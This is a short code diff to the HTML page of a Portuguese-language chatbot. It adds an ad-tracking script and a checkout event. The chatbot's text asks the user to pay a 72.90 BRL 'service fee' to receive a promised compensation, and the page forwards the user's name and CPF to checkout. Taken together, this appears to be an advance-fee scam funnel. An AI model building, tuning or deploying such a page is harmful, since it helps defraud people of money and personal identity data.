@@ -324,6 +324,7 @@
       }
     }
   </style>
+  <script src="/js/fb-tracking.js"></script>
 </head>
 <body>
   <header>
@@ -746,6 +747,13 @@
         await botSay("A taxa de servico cobre validacao operacional, emissao de comprovante e processamento da transferencia em ambiente protegido.");
         await botSay("Apos a confirmacao da taxa, a solicitacao segue para conclusao.");
         appendOptions(["Concluir pagamento e receber minha indenizacao"], "blue", () => {
+          if (typeof fbTrack === "function") {
+            fbTrack("InitiateCheckout", {
+              content_name: "Chat -> Checkout",
+              currency: "BRL",
+              value: 72.90
+            });
+          }
           const checkoutParams = new URLSearchParams();
           checkoutParams.set("nome", state.nome);
           checkoutParams.set("cpf", state.cpf);
